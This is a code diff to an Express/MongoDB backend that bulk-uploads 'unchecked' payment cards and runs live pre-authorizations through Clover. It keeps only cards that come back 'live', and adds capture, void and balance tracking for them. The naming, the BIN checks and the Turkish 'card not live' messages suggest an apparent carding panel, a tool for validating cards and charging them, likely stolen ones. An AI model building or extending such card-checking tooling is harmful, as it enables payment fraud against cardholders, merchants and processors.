@@ -4609,6 +4609,12 @@ async function runProviderCardOperation(req, res, { provider, operation, skipBin
       resultPromise = cloverService.voidPreAuthorization({
         transactionId: payload.transactionId || payload.retref || payload.cloverChargeId
       });
+    } else if (operation === "capture") {
+      resultPromise = cloverService.capturePreAuthorization({
+        transactionId: payload.transactionId || payload.retref || payload.cloverChargeId,
+        amount: Number(payload.amount || 0),
+        currency: payload.currency || "usd"
+      });
     } else {
       const response = buildOperationResponseModel({
         operationId,
@@ -5825,8 +5831,11 @@ function checkedLiveProjection() {
     providerPaymentToken: 1,
     live: 1,
     capture: 1,
+    void: 1,
     auth: 1,
     balance: 1,
+    balanceAmount: 1,
+    balanceStatus: 1,
     lastAction: 1,
     lastAmount: 1,
     lastCurrency: 1,
@@ -5836,6 +5845,7 @@ function checkedLiveProjection() {
     authCurrency: 1,
     authStatus: 1,
     captureStatus: 1,
+    voidStatus: 1,
     lastResult: 1,
     createdAt: 1,
     updatedAt: 1
@@ -6382,7 +6392,7 @@ async function runEncryptedUncheckedCardCheck({ mongo, card, body = {}, userId =
     null;
   const isPreauth = String(body.liveMode || "").toLowerCase() === "preauth";
   const providerApproved = checkedStateFromServiceResult(result);
-  const live = isPreauth && providerApproved && Boolean(providerReferenceId);
+  const live = providerApproved && (isPreauth ? Boolean(providerReferenceId) : true);
   const operatorResult = uncheckedOperatorResult({ live, result });
   const operationAmount = body.displayAmount ?? result.live?.amount ?? result.amount ?? null;
   const operationCurrency = String(result.live?.currency || result.currency || body.currency || "USD").toUpperCase();
@@ -6504,7 +6514,10 @@ async function runEncryptedUncheckedCardCheck({ mongo, card, body = {}, userId =
             auth: true,
             authStatus: "authorized",
             authAmount: operationAmount,
-            authCurrency: operationCurrency
+            authCurrency: operationCurrency,
+            balance: operationAmount != null ? `${operationAmount} ${operationCurrency}` : null,
+            balanceAmount: operationAmount,
+            balanceStatus: "authorized"
           } : {}),
           lastAction: isPreauth ? "auth" : "live_then_bin",
           lastAmount: operationAmount,
@@ -6540,7 +6553,8 @@ app.get("/api/unchecked-cards", requireAuth, requirePermission("canListCards"), 
   const { page, pageSize, skip } = paginationFromQuery(req.query);
   const filter = {};
   if (req.query.checked === "true") filter.checked = true;
-  if (req.query.checked === "false") filter.checked = { $ne: true };
+  else if (req.query.checked === "false") filter.checked = { $ne: true };
+  else filter.checked = { $ne: true };
   if (req.query.q) {
     const q = String(req.query.q).trim();
     filter.$or = [
@@ -6637,10 +6651,15 @@ app.post("/api/unchecked-cards", requireAuth, requirePermission("canCreateCards"
         try {
           const checkedResult = await runEncryptedUncheckedCardCheck({ mongo, card: saved, body: req.body, userId: req.user?.id || null });
           const checkedSaved = await mongo.collection("uncheckedCards").findOne({ recordHash }, { projection: maskOnlyProjection() });
-          row = {
-            ...uncheckedCardPublicFields(checkedSaved || saved),
-            liveCheckResult: checkedResult
-          };
+          if (checkedResult.live) {
+            row = {
+              ...uncheckedCardPublicFields(checkedSaved || saved),
+              liveCheckResult: checkedResult
+            };
+            rows.push(row);
+          } else {
+            errors.push({ index: index + 1, message: "Kart live olmadığı için listeye eklenmedi." });
+          }
         } catch (checkError) {
           const operatorResult = uncheckedOperatorResult({ live: false, error: checkError });
           await mongo.collection("uncheckedCards").updateOne(
@@ -6671,15 +6690,29 @@ app.post("/api/unchecked-cards", requireAuth, requirePermission("canCreateCards"
             operatorMessage: operatorResult.operatorMessage,
             liveCheckError: checkError.message
           };
+          errors.push({ index: index + 1, message: checkError.message || "Kart live olmadığı için listeye eklenmedi." });
         }
+      } else {
+        await mongo.collection("uncheckedCards").updateOne(
+          { recordHash },
+          {
+            $set: {
+              checked: true,
+              live: false,
+              operatorStatus: "not_processed",
+              operatorMessage: "Kart live check yapılmadan listeye eklenmedi.",
+              updatedAt: now
+            }
+          }
+        );
+        errors.push({ index: index + 1, message: "Kart live check yapılmadan listeye eklenmedi." });
       }
-      rows.push(row);
     } catch (error) {
       errors.push({ index: index + 1, message: error.message });
     }
   }
 
-  res.status(rows.length ? 201 : 400).json({
+  res.status(rows.length ? 201 : 200).json({
     status: errors.length ? "partial" : "created",
     inserted: rows.length,
     errors,
@@ -6916,6 +6949,7 @@ app.get("/api/checked-live-cards", requireAuth, requirePermission("canListCards"
   const { page, pageSize, skip } = paginationFromQuery(req.query);
   const filter = {
     $or: [
+      { live: true },
       { providerReferenceId: { $exists: true, $nin: [null, ""] } },
       { authStatus: "authorized" },
       { captureStatus: "captured" },
@@ -7247,7 +7281,7 @@ app.post("/api/checked-cards/:cardId/action", requireAuth, requirePermission("ca
 }));
 
 app.post("/api/checked-live-cards/:cardId/action", requireAuth, requirePermission("canRunAuthCheck"), asyncHandler(async (req, res) => {
-  const allowed = new Set(["capture", "live", "auth", "authorize", "balance"]);
+  const allowed = new Set(["capture", "live", "auth", "authorize", "balance", "void"]);
   const operation = String(req.body.operation || "").toLowerCase();
   if (!allowed.has(operation)) {
     return res.status(400).json({ status: "failed", responseMessage: "Unsupported checked-live action" });
@@ -7260,6 +7294,15 @@ app.post("/api/checked-live-cards/:cardId/action", requireAuth, requirePermissio
   }
 
   const provider = normalizeProviderKey(req.body.provider || card.provider || "clover");
+  if (provider !== "clover") {
+    return res.status(400).json({
+      status: "failed",
+      responseMessage: "Checked-live card actions are currently limited to Clover",
+      provider,
+      operation
+    });
+  }
+
   if (operation === "balance") {
     const balanceAmount = req.body.balanceAmount == null || req.body.balanceAmount === ""
       ? Number(req.body.amount)
@@ -7354,14 +7397,25 @@ app.post("/api/checked-live-cards/:cardId/action", requireAuth, requirePermissio
   if (providerOperation === "capture") {
     statePatch.capture = approved;
     statePatch.captureStatus = approved ? "captured" : "review";
+    statePatch.balanceStatus = approved ? "captured" : (card.balanceStatus || "review");
+    statePatch.balance = approved ? `${lastAmount} ${lastCurrency}` : (card.balance || null);
   }
   if (providerOperation === "auth") {
     statePatch.auth = approved;
     statePatch.authStatus = approved ? "authorized" : "review";
     statePatch.authAmount = lastAmount;
     statePatch.authCurrency = lastCurrency;
+    statePatch.balance = approved ? `${lastAmount} ${lastCurrency}` : (card.balance || null);
+    statePatch.balanceAmount = approved ? lastAmount : (card.balanceAmount ?? null);
+    statePatch.balanceStatus = approved ? "authorized" : (card.balanceStatus || "review");
   }
   if (providerOperation === "live") statePatch.live = approved;
+  if (providerOperation === "void") {
+    statePatch.void = approved;
+    statePatch.voidStatus = approved ? "voided" : "review";
+    statePatch.authStatus = approved ? "voided" : (card.authStatus || "review");
+    statePatch.balanceStatus = approved ? "voided" : (card.balanceStatus || "review");
+  }
   if (providerOperation === "balance") statePatch.balance = approved ? "checked" : "review";
 
   await mongo.collection("checkedLiveCards").updateOne({ id: card.id }, { $set: statePatch });
